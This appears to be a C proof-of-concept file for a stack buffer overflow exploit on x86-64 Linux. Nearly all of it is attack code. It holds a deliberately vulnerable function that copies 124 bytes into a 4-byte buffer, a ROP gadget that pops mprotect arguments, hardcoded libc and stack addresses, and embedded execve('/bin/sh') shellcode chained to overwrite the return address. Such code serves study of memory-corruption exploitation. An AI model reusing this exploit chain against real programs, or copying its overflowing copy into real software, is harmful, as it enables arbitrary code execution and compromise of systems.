#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
//unsigned char shellcode[]="\x55\x48\x89\xe5\xba\x00\x00\x00\x00\x48\x8d\x05\x1c\x00\x00\x00\x48\x89\xc6\x48\x8d\x3d\x0a\x00\x00\x00\xe8\x15\x00\x00\x00\x5d\xc3\x90\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f\x05";
unsigned char shellcode[]="\x8e\x06\x40\x00\x00\x00\x00\x00"               //popfunc's pop cmd addr
"\x07\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x10\x60\x00\x00\x00\x00\x00"                 //mprotect's three params
"\x80\xce\xb0\xf7\xff\x7f\x00\x00"                              //mprotect addr
"\xb0\x10\x60\x00\x00\x00\x00\x00"                             //from mprotect retq, need to run the code below
"\x55\x48\x89\xe5\xba\x00\x00\x00\x00\x48\x8d\x05\x1c\x00\x00\x00\x48\x89\xc6\x48\x8d\x3d\x0a\x00\x00\x00\xe8\x15\x00\x00\x00\x5d\xc3\x90\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f\x05";  //bash code,shell-code.c compile and disassanble
int func(char *shellcode)
{
	char str[4] = "";
	int len = strlen(shellcode);
	memmove(str,shellcode,124);
	printf("%s\n",str);
	return 1;
}

void hacker()  
{  
    printf("hello world\n");
} 
void popfunc()
{
	__asm__("pop    %rdx; pop       %rsi; pop       %rdi; ret;");
}
int main()
{      
	char str[]="1111111122223333444455556666777788889999000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	//int pagesize = getpagesize();
	long *pEIP = (long*)&str[24];
	//*pEIP = &hacker;
	//*pEIP = &shellcode[0];
	memcpy(pEIP, shellcode, 100);
	//int base = (int)&shellcode[0]/pagesize;
	//void* baseAddr = base*pagesize;
        //int j =	mprotect(baseAddr,pagesize, PROT_READ|PROT_WRITE|PROT_EXEC);
	func(str);
	printf("return from func()\n");
        __asm__("popq   %rdx");
	return 0;
}
